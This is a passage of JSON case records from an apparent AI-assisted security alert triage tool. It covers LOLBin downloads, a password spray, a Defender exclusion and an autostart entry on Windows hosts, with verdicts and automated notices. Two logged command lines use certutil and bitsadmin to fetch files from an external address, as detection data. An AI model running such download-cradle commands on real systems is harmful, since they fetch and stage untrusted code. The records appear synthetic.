agent","status":"sent"}],"skipped":[],"notified":true,"approvals":[]},"actions":[{"id":14,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.686265+00:00","finished_at":null,"expires_at":null},{"id":15,"action":"evidence","target":"light evidence","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.689260+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"7":{"id":7,"dedup_key":"d6","signature":"sig6","status":"open","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":"C:\\Windows\\System32\\certutil.exe","process_id":"5120","command_line":"certutil -urlcache -f http://198.51.100.20/a.txt a.txt","user_name":"CORP\\c.chen","iocs":{},"conclusive":false,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":0.6,"risk":"medium","recommended_action":null,"reasoning":"certutil downloaded a file from an unknown address; could be an admin script or a download cradle.","verdict_by":"ai","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-25T09:57:23.252793+00:00","last_seen":"2026-10-25T09:58:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":"CORP\\c.chen","image":"C:\\Windows\\System32\\certutil.exe","commandLine":"certutil -urlcache -f http://198.51.100.20/a.txt a.txt"}}},"rule":{"id":"100146","level":10,"mitre":{"id":["T1105"]},"description":"LOLBin used to download or decode a file"},"agent":{"id":"002","name":"WS-FIN-02"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"}],"skipped":[],"notified":true,"approvals":[]},"actions":[{"id":16,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.740357+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"33":{"id":33,"dedup_key":"h2-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-24T15:57:23.252793+00:00","last_seen":"2026-10-24T15:57:23.252793+00:00","closed_at":"2026-10-24T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"34":{"id":34,"dedup_key":"h2-1","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-24T14:57:23.252793+00:00","last_seen":"2026-10-24T14:57:23.252793+00:00","closed_at":"2026-10-24T14:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"8":{"id":8,"dedup_key":"d7","signature":"sig7","status":"open","rule_id":100235,"rule_level":12,"rule_desc":"5+ account lockouts within 5 minutes (possible password spray)","technique":"T1110.003","agent_id":"006","agent_name":"DC01","source_ip":"10.0.10.88","process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":6,"verdict":"NEEDS_REVIEW","confidence":0.5,"risk":"medium","recommended_action":null,"reasoning":"Several accounts locked out in a short time from one workstation address.","verdict_by":"ai","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-24T13:57:23.252793+00:00","last_seen":"2026-10-24T14:03:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":null,"image":null,"commandLine":null}}},"rule":{"id":"100235","level":12,"mitre":{"id":["T1110.003"]},"description":"5+ account lockouts within 5 minutes (possible password spray)"},"agent":{"id":"006","name":"DC01"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"notify","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"}],"skipped":[],"notified":true,"approvals":[]},"actions":[{"id":17,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.794824+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"35":{"id":35,"dedup_key":"h2-2","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"003","agent_name":"WS-HR-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-24T13:57:23.252793+00:00","last_seen":"2026-10-24T13:57:23.252793+00:00","closed_at":"2026-10-24T13:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"36":{"id":36,"dedup_key":"h2-3","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"004","agent_name":"WS-SALES-03","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-24T12:57:23.252793+00:00","last_seen":"2026-10-24T12:57:23.252793+00:00","closed_at":"2026-10-24T12:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"9":{"id":9,"dedup_key":"d8","signature":"sig8","status":"closed","rule_id":100211,"rule_level":12,"rule_desc":"Microsoft Defender exclusion added or changed","technique":"T1562.001","agent_id":"005","agent_name":"SRV-FILE-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":"CORP\\admin.it","iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":1.0,"risk":"low","recommended_action":null,"reasoning":"Reused analyst verdict: the backup agent adds this exclusion after each update.","verdict_by":"knowledge","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-23T17:57:23.252793+00:00","last_seen":"2026-10-23T17:58:23.252793+00:00","closed_at":"2026-10-26T15:57:25.787379+00:00","alert":{"data":{"win":{"eventdata":{"user":"CORP\\admin.it","image":null,"commandLine":null}}},"rule":{"id":"100211","level":12,"mitre":{"id":["T1562.001"]},"description":"Microsoft Defender exclusion added or changed"},"agent":{"id":"005","name":"SRV-FILE-01"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"notify","close_reason":"Closed by admin","decision":{"actions":[],"skipped":[],"notified":false,"approvals":[]},"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":7,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-29T15:57:23.295869+00:00","disabled":false}},"32":{"id":32,"dedup_key":"h3-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-23T15:57:23.252793+00:00","last_seen":"2026-10-23T15:57:23.252793+00:00","closed_at":"2026-10-23T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"29":{"id":29,"dedup_key":"h4-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-22T15:57:23.252793+00:00","last_seen":"2026-10-22T15:57:23.252793+00:00","closed_at":"2026-10-22T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"30":{"id":30,"dedup_key":"h4-1","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-22T14:57:23.252793+00:00","last_seen":"2026-10-22T14:57:23.252793+00:00","closed_at":"2026-10-22T14:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"31":{"id":31,"dedup_key":"h4-2","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"003","agent_name":"WS-HR-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-22T13:57:23.252793+00:00","last_seen":"2026-10-22T13:57:23.252793+00:00","closed_at":"2026-10-22T13:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"10":{"id":10,"dedup_key":"d9","signature":"sig9","status":"open","rule_id":100240,"rule_level":9,"rule_desc":"Autostart registry value set by C:\\Users\\d.kumar\\AppData\\Roaming\\updater.exe","technique":"T1547.001","agent_id":"003","agent_name":"WS-HR-01","source_ip":null,"process_image":"C:\\Users\\d.kumar\\AppData\\Roaming\\updater.exe","process_id":"2290","command_line":null,"user_name":"CORP\\d.kumar","iocs":{},"conclusive":false,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":0.4,"risk":"medium","recommended_action":null,"reasoning":"A program in the roaming profile registered itself in the Run key; first time seen in the company.","verdict_by":"ai","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-22T11:57:23.252793+00:00","last_seen":"2026-10-22T11:58:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":"CORP\\d.kumar","image":"C:\\Users\\d.kumar\\AppData\\Roaming\\updater.exe","commandLine":null}}},"rule":{"id":"100240","level":9,"mitre":{"id":["T1547.001"]},"description":"Autostart registry value set by C:\\Users\\d.kumar\\AppData\\Roaming\\updater.exe"},"agent":{"id":"003","name":"WS-HR-01"}},"incident_id":null,"first_seen_env":true,"storm":false,"host_mode":"contain","close_reason":null,"decision":{"actions":[{"action":"notice","detail":"sent to the agent","status":"sent"}],"skipped":[],"notified":true,"approvals":[]},"actions":[{"id":18,"action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"created_at":"2026-10-26T15:57:23.900976+00:00","finished_at":null,"expires_at":null}],"approvals":[],"knowledge":null},"27":{"id":27,"dedup_key":"h6-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-20T15:57:23.252793+00:00","last_seen":"2026-10-20T15:57:23.252793+00:00","closed_at":"2026-10-20T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"28":{"id":28,"dedup_key":"h6-1","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-20T14:57:23.252793+00:00","last_seen":"2026-10-20T14:57:23.252793+00:00","closed_at":"2026-10-20T14:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"11":{"id":11,"dedup_key":"d10","signature":"sig10","status":"open","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"007","agent_name":"KIOSK-01","source_ip":null,"process_image":"C:\\Windows\\System32\\bitsadmin.exe","process_id":"1880","command_line":"bitsadmin /transfer job http://198.51.100.20/x.exe","user_name":"KIOSK-01\\kiosk","iocs":{},"conclusive":false,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":0.5,"risk":"medium","recommended_action":null,"reasoning":"bitsadmin download on a kiosk; the kiosk group is in monitor mode, so nothing was done.","verdict_by":"ai","ti_summary":[],"analyst_verdict":null,"first_seen":"2026-10-20T09:57:23.252793+00:00","last_seen":"2026-10-20T09:58:23.252793+00:00","closed_at":null,"alert":{"data":{"win":{"eventdata":{"user":"KIOSK-01\\kiosk","image":"C:\\Windows\\System32\\bitsadmin.exe","commandLine":"bitsadmin /transfer job http://198.51.100.20/x.exe"}}},"rule":{"id":"100146","level":10,"mitre":{"id":["T1105"]},"description":"LOLBin used to download or decode a file"},"agent":{"id":"007","name":"KIOSK-01"}},"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":"monitor","close_reason":null,"decision":{"actions":[],"skipped":[],"notified":true,"approvals":[]},"actions":[],"approvals":[],"knowledge":null},"23":{"id":23,"dedup_key":"h7-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-19T15:57:23.252793+00:00","last_seen":"2026-10-19T15:57:23.252793+00:00","closed_at":"2026-10-19T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"24":{"id":24,"dedup_key":"h7-1","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-19T14:57:23.252793+00:00","last_seen":"2026-10-19T14:57:23.252793+00:00","closed_at":"2026-10-19T14:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"25":{"id":25,"dedup_key":"h7-2","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"003","agent_name":"WS-HR-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-19T13:57:23.252793+00:00","last_seen":"2026-10-19T13:57:23.252793+00:00","closed_at":"2026-10-19T13:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"26":{"id":26,"dedup_key":"h7-3","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"004","agent_name":"WS-SALES-03","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-19T12:57:23.252793+00:00","last_seen":"2026-10-19T12:57:23.252793+00:00","closed_at":"2026-10-19T12:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"22":{"id":22,"dedup_key":"h8-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-18T15:57:23.252793+00:00","last_seen":"2026-10-18T15:57:23.252793+00:00","closed_at":"2026-10-18T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"19":{"id":19,"dedup_key":"h9-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-17T15:57:23.252793+00:00","last_seen":"2026-10-17T15:57:23.252793+00:00","closed_at":"2026-10-17T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"20":{"id":20,"dedup_key":"h9-1","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-17T14:57:23.252793+00:00","last_seen":"2026-10-17T14:57:23.252793+00:00","closed_at":"2026-10-17T14:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"21":{"id":21,"dedup_key":"h9-2","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"003","agent_name":"WS-HR-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-17T13:57:23.252793+00:00","last_seen":"2026-10-17T13:57:23.252793+00:00","closed_at":"2026-10-17T13:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"17":{"id":17,"dedup_key":"h11-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-15T15:57:23.252793+00:00","last_seen":"2026-10-15T15:57:23.252793+00:00","closed_at":"2026-10-15T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"18":{"id":18,"dedup_key":"h11-1","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-15T14:57:23.252793+00:00","last_seen":"2026-10-15T14:57:23.252793+00:00","closed_at":"2026-10-15T14:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"13":{"id":13,"dedup_key":"h12-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-14T15:57:23.252793+00:00","last_seen":"2026-10-14T15:57:23.252793+00:00","closed_at":"2026-10-14T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"14":{"id":14,"dedup_key":"h12-1","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"002","agent_name":"WS-FIN-02","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-14T14:57:23.252793+00:00","last_seen":"2026-10-14T14:57:23.252793+00:00","closed_at":"2026-10-14T14:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"15":{"id":15,"dedup_key":"h12-2","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a 